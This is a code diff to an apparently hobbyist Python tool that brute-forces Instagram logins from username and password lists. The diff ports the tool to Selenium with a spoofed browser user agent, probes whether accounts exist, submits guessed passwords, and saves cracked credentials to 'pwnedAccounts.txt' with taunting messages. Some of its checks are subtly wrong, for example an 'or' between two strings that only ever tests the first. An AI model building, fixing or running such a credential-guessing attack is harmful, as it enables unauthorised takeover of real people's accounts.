@@ -1,56 +1,55 @@
 #!/bin/python
 from mainLib import *
+from time import sleep
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
 import simplejson as json
 import sys
 import optparse
 
-
+profile = webdriver.FirefoxProfile()
+profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
+driver = webdriver.Firefox(profile)
+driver.implicitly_wait(30)
 def userExists(username):
 	try:
-		response = br.open('https://instagram.com/'+username)
-		response.read()
-	except mechanize.HTTPError as e:
-		if str(e) == 'HTTP Error 404: NOT FOUND':
-			print 'user: "%s" does not exist, trying with the next!' %username
-			return 1
+		driver.get("https://instagram.com/"+username)
+		assert (("Page Not Found" or "no encontrada") not in driver.title)
+	except AssertionError:
+		print 'user: "%s" does not exist, trying with the next!' %username
+		return 1
 	except:
 		'uknown error'
 		
 def login(user, password):
-        try:
-			response = br.open('https://instagram.com/accounts/login')
-			for cookie in cj:
-				if (cookie.name == 'csrftoken'):
-					csrftoken = cookie.value
-					print 'Trying with password: ' + password
-			br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'),('X-CSRFToken',csrftoken), ('Connection', 'keep-alive'),('Origin' ,'https://instagram.com'), ('X-Instagram-AJAX' , '1'),('Referer' ,'https://instagram.com/accounts/login/'), ('X-Requested-With', 'XMLHttpRequest')]
-		
-			response = br.open('https://instagram.com/accounts/login/ajax/', 'username='+user+'&password='+password)
-			respuesta = response.read()
-			json_dump = json.loads(respuesta)
-			if json_dump['authenticated'] == True:
-				print 'Access granted mother kaker!!' 
-				print 'The password is: ' + password
-				try:
-					f = open('pwnedAccounts.txt','a')
-				except:
-					f = open('pwnedAccounts.txt','w')
-				f.write('username:'+user+'\npassword:'+password+'\n')
-				f.close()
-				return 1
-
-        except mechanize.HTTPError as e:
-			print str(e.code)
-        except mechanize.URLError as e:
-			print str(e.reason.args)
-        except:
-			print "\r Check your connection to the internet mother kaker\r"
+	try:
+		print 'Trying with password: ' + password
+		elem = driver.find_element_by_name("username")
+		elem.send_keys(user)
+		elem = driver.find_element_by_name("password")
+		elem.send_keys(password)  
+		elem.send_keys(Keys.RETURN)
+		assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
+	except AssertionError:
+		print 'Access granted mother kaker!!' 
+		print 'The password is: ' + password
+		try:
+			f = open('pwnedAccounts.txt','a')
+		except:
+			f = open('pwnedAccounts.txt','w')
+		f.write('username:'+user+'\npassword:'+password+'\n')
+		f.close()
+		return 1
+	except:
+		print "\r Check your connection to the internet mother kaker\r"
 
 def dictionaryAttack(usernames,passwords):
 	if str(type(usernames)) == "<type 'list'>":
 		for username in usernames:
 			if (userExists(username) == 1):
 				continue
+			driver.get("https://instagram.com/accounts/login/")
+			sleep(30)
 			print 'Trying with username: ' + username
 			for password in passwords:
 				if (login(username,password) == 1):
@@ -59,6 +58,7 @@ def dictionaryAttack(usernames,passwords):
 	else:
 		if (userExists(usernames) == 1):
 			return
+		driver.get("https://instagram.com/accounts/login/")
 		print 'Trying with username: ' + usernames
 		for password in passwords:
 			if (login(usernames,password) == 1):
@@ -110,5 +110,7 @@ def main():
 		dictionaryAttack(usernames,passwords)
 	else:
 		dictionaryAttack(options.username,passwords)
-
-main()
+	
+	driver.close()
+if __name__ == '__main__':
+	main()
